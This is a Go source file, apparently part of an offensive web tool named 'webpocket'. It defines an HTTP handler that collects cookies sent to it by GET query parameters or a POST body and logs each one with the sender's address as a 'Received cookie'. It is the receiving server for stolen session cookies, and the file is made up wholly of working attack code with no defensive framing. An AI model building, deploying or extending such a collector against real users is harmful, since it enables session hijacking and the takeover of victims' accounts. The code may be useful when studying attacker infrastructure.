package webpocket

import (
	"bufio"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
)

type CookieReceiver struct {
	LogFile *os.File
}

func (cr *CookieReceiver) CreateCookieLog(path string) {
	cr.LogFile = CreateLogFile(path)
}

func (cr *CookieReceiver) ReceiveCookies(w http.ResponseWriter, r *http.Request) {

	switch r.Method {

	case "GET":
		getParams := r.URL.Query()
		for key, vals := range getParams {
			val := strings.Join(vals, "; ")
			fmt.Fprintf(cr.LogFile, "%s%s%s%s%s\n", r.RemoteAddr, CookieLogDelim, key, CookieLogDelim, val)
			if !Quite {
				log.Printf("%s Received cookie:\n", LogSuccess)
				fmt.Printf("%s%s%s%s%s\n", r.RemoteAddr, CookieLogDelim, key, CookieLogDelim, val)
			}
		}

	case "POST":
		scanner := bufio.NewScanner(r.Body)
		scanner.Scan()
		cookies := strings.Split(scanner.Text(), "; ")

		for _, val := range cookies {
			cookieBuf := strings.SplitN(val, "=", 2)

			if cookieBuf[1] == "" {
				cookieBuf[1] = "[NULL]"
			}
			fmt.Fprintf(cr.LogFile, "%s%s%s%s%s\n", r.RemoteAddr, CookieLogDelim, cookieBuf[0], CookieLogDelim, cookieBuf[1])

			if !Quite {
				log.Printf("%s Received cookie:\n", LogSuccess)
				fmt.Printf("%s%s%s%s%s\n", r.RemoteAddr, CookieLogDelim, cookieBuf[0], CookieLogDelim, cookieBuf[1])
			}
		}

	}
}
